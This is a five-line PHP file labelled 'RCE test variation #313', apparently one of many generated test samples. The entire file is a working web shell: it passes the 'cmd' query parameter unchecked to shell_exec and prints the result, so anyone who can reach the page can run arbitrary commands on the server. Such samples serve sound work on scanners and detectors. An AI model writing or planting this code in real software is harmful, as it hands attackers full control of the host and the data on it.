<?php
// RCE test variation #313
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>